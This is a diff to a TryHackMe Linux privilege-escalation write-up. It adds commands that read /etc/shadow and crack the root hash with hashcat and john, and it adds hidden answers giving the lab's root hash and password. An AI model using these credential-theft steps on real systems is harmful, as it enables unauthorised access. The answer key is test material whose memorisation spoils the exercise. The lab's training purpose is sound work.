@@ -1,4 +1,4 @@
-![Windows PrivEsc Banner](https://i.imgur.com/2dmv1BY.png)
+![Windows PrivEsc Banner](https://i.imgur.com/RuMC2vG.png)
 
 <p align="center">
    <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Linux_Priv_Esc_Cover.png" alt="Linux PrivEsc Logo">
@@ -6,7 +6,7 @@
 
 # Linux PrivEsc
 
-This guide contains the answer and steps necessary to get to them for the [Windows PrivEsc](https://tryhackme.com/room/windows10privesc) room.
+This guide contains the answer and steps necessary to get to them for the [Linux PrivEsc](https://tryhackme.com/room/linuxprivesc) room.
 
 ## Table of contents
 
@@ -37,7 +37,36 @@ This guide contains the answer and steps necessary to get to them for the [Windo
 
 **Password:** password321
 
+https://www.exploit-db.com/exploits/1518
+
 ### Service Exploits
+
+ssh user@10.10.42.225
+ls -lh /etc/shadow
+cat /etc/shadow
+su -u root
+hashcat -m 1800 password.hash /usr/share/wordlists/rockyou.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt password.hash
+
+
+1. What is the root user's password hash?
+
+   
+
+   ><details><summary>Click for answer</summary>$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0</details>
+
+2. What hashing algorithm was used to produce the root user's password hash?
+
+   
+
+   ><details><summary>Click for answer</summary>sha512crypt</details>
+
+3. What is the root user's password?
+
+   
+
+   ><details><summary>Click for answer</summary>password123</details>
+
 ### Weak File Permissions - Readable /etc/shadow
 ### Weak File Permissions - Writable /etc/shadow
 ### Weak File Permissions - Writable /etc/passwd
